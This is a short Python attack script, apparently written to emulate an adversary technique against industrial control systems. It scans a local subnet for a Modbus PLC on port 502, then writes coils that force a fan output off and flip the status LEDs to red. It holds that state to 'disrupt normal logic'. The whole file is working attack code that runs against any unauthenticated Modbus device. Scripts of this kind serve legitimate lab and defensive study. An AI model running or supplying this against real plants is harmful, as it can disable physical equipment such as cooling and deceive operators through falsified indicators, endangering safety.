import socket
import struct
from pymodbus.client.sync import ModbusTcpClient
from pymodbus.constants import Defaults
from pymodbus.exceptions import ModbusException
import time


def discover_plc_on_network():
    """
    Discover the PLC's IP address by scanning the local network.
    Assumes the PLC is on the same subnet as the workstation.
    """
    print("Scanning for the PLC on the local network...")
    discovered_ip = None

    # Use basic socket communication to look for devices on the network
    network_prefix = "192.168.9."
    for i in range(1, 255):  # Scan all potential addresses on the network
        ip = f"{network_prefix}{i}"
        try:
            # Attempt to open a TCP connection on Modbus port 502
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as scan_socket:
                scan_socket.settimeout(0.5)
                if scan_socket.connect_ex((ip, Defaults.Port)) == 0:  # Defaults.Port = 502
                    print(f"PLC found at IP: {ip}")
                    discovered_ip = ip
                    break
        except Exception as e:
            pass

    if not discovered_ip:
        print("Could not discover any Modbus-enabled PLC on the network. Exiting...")
        exit(1)

    return discovered_ip


def manipulate_io_image(plc_ip):
    """
    Use Modbus commands to manipulate the PLC's Output Image Table and disrupt normal logic.
    """
    # Connect to the PLC's Modbus server
    print(f"Connecting to PLC at {plc_ip}...")
    client = ModbusTcpClient(plc_ip)
    connection = client.connect()

    if not connection:
        print("Failed to connect to PLC. Exiting...")
        return

    try:
        print("Connected to PLC. Manipulating I/O image...")

        # Example: Force the Fan output (%Q0.0) to OFF
        FAN_ADDRESS = 0  # Modbus coil (digital output) address for %Q0.0
        FAN_OVERRIDE_VALUE = False  # Force fan to OFF
        client.write_coil(FAN_ADDRESS, FAN_OVERRIDE_VALUE)
        print(f"Set Output %Q0.0 (Fan) to {FAN_OVERRIDE_VALUE}.")

        # Example: Override the FanA Red LED (%Q0.4) to ON
        RED_LED_ADDRESS = 4  # Modbus coil address for %Q0.4
        RED_LED_OVERRIDE_VALUE = True  # Force red LED ON
        client.write_coil(RED_LED_ADDRESS, RED_LED_OVERRIDE_VALUE)
        print(f"Set Output %Q0.4 (Red LED) to {RED_LED_OVERRIDE_VALUE}.")

        # Example: Override the FanA Green LED (%Q0.5) to OFF (disable green LED)
        GREEN_LED_ADDRESS = 5  # Modbus coil address for %Q0.5
        GREEN_LED_OVERRIDE_VALUE = False  # Force green LED OFF
        client.write_coil(GREEN_LED_ADDRESS, GREEN_LED_OVERRIDE_VALUE)
        print(f"Set Output %Q0.5 (Green LED) to {GREEN_LED_OVERRIDE_VALUE}.")

        # Hold the I/O in the manipulated state for 60 seconds (or indefinitely, depending on adversary intent)
        print("Manipulated I/O image will be held for 60 seconds...")
        time.sleep(60)

    except ModbusException as e:
        print(f"Error during Modbus operation: {e}")
    finally:
        # Close the connection to the PLC
        client.close()
        print("Closed connection to PLC.")


if __name__ == "__main__":
    # Discover the PLC's IP, then manipulate its I/O table
    plc_ip = discover_plc_on_network()
    manipulate_io_image(plc_ip)